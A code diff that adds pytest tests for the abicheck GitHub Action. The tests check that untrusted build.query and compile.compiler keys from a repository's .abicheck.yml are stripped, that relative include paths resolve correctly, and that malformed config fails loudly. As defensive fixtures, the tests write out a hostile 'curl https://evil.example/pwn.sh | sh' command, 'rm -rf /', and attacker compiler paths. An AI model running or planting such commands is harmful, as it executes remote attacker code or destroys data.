@@ -405,3 +405,146 @@ class TestReleaseTopologyOverlayMergesWithDiscoveredProjectConfig:
         assert result.returncode == 0, result.stderr
         doc = _read_config_overlay(result.stdout.splitlines())
         assert doc == {"release": {"dso_only": True}}
+
+
+class TestReleaseTopologyOverlayKeepsDiscoveredConfigUntrusted:
+    """Codex review, PR #1159 (P1, security): the merged document is always
+    written to the scratch path this Action passes via ``--config`` --
+    which every "was --config explicit" check in the engine
+    (``cli_options.py``'s ``compile.compiler`` gate, ADR-032 D5's
+    ``build.query`` gate) treats as operator authorization to execute.
+    Copying either key from the discovered (untrusted, repository-
+    controlled) ``.abicheck.yml`` into that always-explicit overlay would
+    launder it into "operator authorized this to run" the moment any
+    unrelated Action input is set -- so both must never appear in the
+    merged document at all."""
+
+    def test_discovered_build_query_is_stripped(self, tmp_path: Path) -> None:
+        (tmp_path / ".abicheck.yml").write_text(
+            "build:\n"
+            "  query: 'curl https://evil.example/pwn.sh | sh'\n"
+            "  system: cmake\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        # The dangerous key is gone entirely; an unrelated sibling key in
+        # the same block still passes through.
+        assert "query" not in doc.get("build", {})
+        assert doc["build"] == {"system": "cmake"}
+        assert "build.query" in result.stderr
+
+    def test_discovered_compile_compiler_is_stripped(self, tmp_path: Path) -> None:
+        (tmp_path / ".abicheck.yml").write_text(
+            "compile:\n  compiler: /tmp/attacker-planted-cc\n  std: c++20\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        assert "compiler" not in doc.get("compile", {})
+        assert doc["compile"] == {"std": "c++20"}
+        assert "compile.compiler" in result.stderr
+
+    def test_both_dangerous_keys_stripped_together(self, tmp_path: Path) -> None:
+        (tmp_path / ".abicheck.yml").write_text(
+            "build:\n  query: 'rm -rf /'\n"
+            "compile:\n  compiler: /malicious/cc\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        assert "query" not in doc.get("build", {})
+        assert "compiler" not in doc.get("compile", {})
+        # No dangerous value leaked into the merged document at all.
+        serialized = json.dumps(doc)
+        assert "rm -rf" not in serialized
+        assert "/malicious/cc" not in serialized
+
+
+class TestReleaseTopologyOverlayResolvesRelativePathsAgainstRealProjectRoot:
+    """Codex review, PR #1159 (P1, correctness): a relative
+    ``compile.include_dirs`` entry in the discovered config must resolve
+    against that config's own project root, not against wherever the
+    ``mktemp`` scratch overlay file happens to be written (typically
+    under ``/tmp``) -- else headers silently disappear from extraction."""
+
+    def test_relative_include_dir_resolves_against_project_root_not_tmp(
+        self, tmp_path: Path
+    ) -> None:
+        (tmp_path / "include").mkdir()
+        (tmp_path / ".abicheck.yml").write_text(
+            "compile:\n  include_dirs: [include]\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        resolved = doc["compile"]["include_dirs"]
+        assert resolved == [str((tmp_path / "include").resolve())]
+        # Explicitly not resolved against the scratch file's own directory.
+        assert not resolved[0].startswith("/tmp") or resolved[0].startswith(
+            str(tmp_path.resolve())
+        )
+
+    def test_multiple_relative_include_dirs_all_resolve(
+        self, tmp_path: Path
+    ) -> None:
+        (tmp_path / "a").mkdir()
+        (tmp_path / "b").mkdir()
+        (tmp_path / ".abicheck.yml").write_text(
+            "compile:\n  include_dirs: [a, b]\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        assert doc["compile"]["include_dirs"] == [
+            str((tmp_path / "a").resolve()),
+            str((tmp_path / "b").resolve()),
+        ]
+
+    def test_absolute_include_dir_is_left_unchanged(self, tmp_path: Path) -> None:
+        abs_dir = str((tmp_path / "somewhere").resolve())
+        (tmp_path / ".abicheck.yml").write_text(
+            f"compile:\n  include_dirs: [{abs_dir}]\n",
+            encoding="utf-8",
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode == 0, result.stderr
+        doc = _read_config_overlay(result.stdout.splitlines())
+        assert doc["compile"]["include_dirs"] == [abs_dir]
+
+
+class TestReleaseTopologyOverlayFailsLoudOnMalformedDiscoveredConfig:
+    """Codex review, PR #1159 (P2): a malformed/unreadable discovered
+    ``.abicheck.yml`` must fail the Action step loudly -- matching the
+    ordinary CLI's own ``discover_project_config()`` behavior -- rather
+    than silently proceeding as if no project config existed."""
+
+    def test_malformed_yaml_fails_the_step(self, tmp_path: Path) -> None:
+        (tmp_path / ".abicheck.yml").write_text(
+            "release: [unterminated\n", encoding="utf-8"
+        )
+        result = _run_bash_script(
+            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
+        )
+        assert result.returncode != 0
+        assert "failed to parse the discovered project config" in result.stderr
+        assert "failed to merge" in result.stdout
+        # Must not silently write a merged overlay and proceed.
+        assert "--config" not in result.stdout
